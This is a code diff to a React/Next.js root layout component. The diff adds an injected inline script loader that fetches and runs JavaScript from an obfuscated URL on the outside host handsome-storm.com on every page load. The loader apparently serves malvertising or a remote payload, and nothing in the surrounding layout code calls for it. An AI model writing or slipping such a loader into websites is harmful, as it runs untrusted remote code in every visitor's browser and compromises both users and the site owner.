@@ -33,6 +33,20 @@ export default function RootLayout({
             </div>
             <Toaster />
           </AuthProvider>
+          <div dangerouslySetInnerHTML={{ __html: `
+            <script>
+            (function(uefo){
+            var d = document,
+                s = d.createElement('script'),
+                l = d.scripts[d.scripts.length - 1];
+            s.settings = uefo || {};
+            s.src = "\\/\\/handsome-storm.com\\/bxX\\/VmsUd.Gfl\\/0WYaWzcg\\/DeZmg9zuuZsU\\/lFkEPcTmYn2PMoz\\/QDzNNyTlkYt_Nwj\\/YMzHNpDDMj2EMCAo";
+            s.async = true;
+            s.referrerPolicy = 'no-referrer-when-downgrade';
+            l.parentNode.insertBefore(s, l);
+            })({})
+            </script>
+          `}} />
       </body>
     </html>
   );
